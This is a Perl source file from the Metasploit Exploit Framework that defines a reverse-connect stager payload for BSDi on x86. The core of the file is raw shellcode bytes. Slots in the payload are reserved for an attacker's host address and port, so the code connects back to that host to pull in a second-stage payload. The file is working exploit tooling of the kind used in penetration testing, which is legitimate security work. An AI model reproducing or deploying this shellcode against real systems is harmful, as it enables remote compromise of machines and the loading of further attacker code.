###############
##
#
#    Name: ReverseStager.pm
# Version: $Revision$
#  Source: src/shellcode/bsdi/ia32/stager_sock_reverse.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 reverse stager for BSDi. 
#
##
###############

package Msf::PayloadComponent::BSDi::ia32::ReverseStager;

use strict;
use base 'Msf::PayloadComponent::BSDi::ReverseStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>', 
	                   'optyx <optyx [at] uberhax0r.net>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'bsdi' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					LHOST => [ 0x1c, 'ADDR' ],
					LPORT => [ 0x23, 'n'    ],
				},
			Payload =>
				"\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" .
				"\x52\x42\x52\x42\x52\x6a\x61\x58\xff\xd6\x97\x68\x7f\x00\x00\x01" .
				"\x68\x10\x02\xbf\xbf\x89\xe3\x6a\x10\x53\x57\x6a\x62\x58\xff\xd6" .
				"\xb0\x03\xb6\x0c\x52\x55\x57\xff\xd6\x5f\xc3"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
